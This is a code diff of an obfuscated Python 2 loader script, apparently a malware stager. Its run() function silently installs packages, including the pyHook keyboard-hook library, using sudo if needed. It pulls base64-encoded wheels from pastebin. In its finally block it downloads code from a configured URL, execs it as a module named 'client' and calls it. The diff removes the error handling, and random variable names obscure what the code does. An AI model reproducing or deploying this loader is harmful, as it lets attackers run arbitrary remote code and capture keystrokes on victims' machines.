@@ -25,31 +25,27 @@ def run(*args, **kwargs):
         try:
             for FoamyNonstopHistory, NobleRusticWalrus in AccidentalAquaticCactus['packages'][os.name][str(struct.calcsize('P') * 8)].items():
                 if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
-                    try:
-                        RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
-                    except Exception as e:
-                        print 'Error:', str(e)
+                    RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
                     if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])):
-                        try:
-                            RuthlessSpiffyTablecloth(['sudo', GroovySophisticatedLemur, 'install', FoamyNonstopHistory])
-                        except Exception as e:
-                            print 'Error:', str(e)
-                        if not len(RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'show', FoamyNonstopHistory])) and 'pastebin' in NobleRusticWalrus:
-                            if 'pyHook' in FoamyNonstopHistory:
-                                ZonkedEnthusiasticTadpole = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
-                            elif 'pypiwin32' in FoamyNonstopHistory:
-                                ZonkedEnthusiasticTadpole = 'pywin32-221-cp27-cp27m-win_amd64.whl'
-                            try:
-                                with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
-                                    fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
-                                RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
-                            except Exception as e:
-                                print 'Error:', str(e)
-                            if os.path.isfile(os.path.basename(NobleRusticWalrus)):
-                                os.remove(os.path.basename(NobleRusticWalrus))
+                        if 'pyHook' in FoamyNonstopHistory and 'pastebin' in NobleRusticWalrus:
+                            ZonkedEnthusiasticTadpole = 'pyHook-1.5.1-cp27-cp27m-win_amd64.whl'
+                            with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
+                                fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
+                            RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
+                            if os.path.isfile(ZonkedEnthusiasticTadpole):
+                                os.remove(ZonkedEnthusiasticTadpole)
+                        elif 'pypiwin32' in FoamyNonstopHistory and 'pastebin' in NobleRusticWalrus:
+                            ZonkedEnthusiasticTadpole = 'pywin32-221-cp27-cp27m-win_amd64.whl'
+                            with file(ZonkedEnthusiasticTadpole, 'wb') as fp:
+                                fp.write(base64.b64decode(urllib.urlopen(NobleRusticWalrus).read()))
+                            RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', ZonkedEnthusiasticTadpole])
+                            SilkyPerilousManifesto    = os.path.join(sys.prefix, os.path.join('Scripts', 'pywin32_postinstall.py'))
+                            if os.path.isfile(SilkyPerilousManifesto):
+                                RuthlessSpiffyTablecloth([SilkyPerilousManifesto, '-install'])
+                            if os.path.isfile(ZonkedEnthusiasticTadpole):
+                                os.remove(ZonkedEnthusiasticTadpole)
                         else:
-                            print FoamyNonstopHistory, 'loaded'
-                            continue
+                            RuthlessSpiffyTablecloth([GroovySophisticatedLemur, 'install', NobleRusticWalrus])
                     else:
                         print FoamyNonstopHistory, 'loaded'
                         continue
@@ -57,16 +53,15 @@ def run(*args, **kwargs):
                     print FoamyNonstopHistory, 'loaded'
                     continue
         finally:
-            try:
-                AmbiguousObedientQuestion   = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__u__'))
-                TalentedAlcoholicBeetle     = os.path.splitext(os.path.basename(AmbiguousObedientQuestion))[0]
-                PanoramicAbandonedCraftsman = imp.new_module(TalentedAlcoholicBeetle)
-                QuarrelsomeImportedAtom     = urllib.urlopen(AmbiguousObedientQuestion).read()
-                MajesticMachoOkra           = compile(QuarrelsomeImportedAtom, TalentedAlcoholicBeetle, 'exec')
-                exec MajesticMachoOkra in PanoramicAbandonedCraftsman.__dict__
-                return PanoramicAbandonedCraftsman.main(**AccidentalAquaticCactus['settings'])
-            except Exception as e:
-                print 'Error:', str(e)
+            AmbiguousObedientQuestion   = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__u__'))
+            TalentedAlcoholicBeetle     = os.path.splitext(os.path.basename(AmbiguousObedientQuestion))[0]
+            PanoramicAbandonedCraftsman = imp.new_module(TalentedAlcoholicBeetle)
+            QuarrelsomeImportedAtom     = urllib.urlopen(AmbiguousObedientQuestion).read()
+            MajesticMachoOkra           = compile(QuarrelsomeImportedAtom, TalentedAlcoholicBeetle, 'exec')
+            exec MajesticMachoOkra in PanoramicAbandonedCraftsman.__dict__
+            sys.modules['client']       = PanoramicAbandonedCraftsman
+            globals()['client']         = PanoramicAbandonedCraftsman
+            return sys.modules['client'].main(**AccidentalAquaticCactus['settings'])
 
 def main(*args, **kwargs):
     s = 'tasklist' if os.name is 'nt' else 'ps'
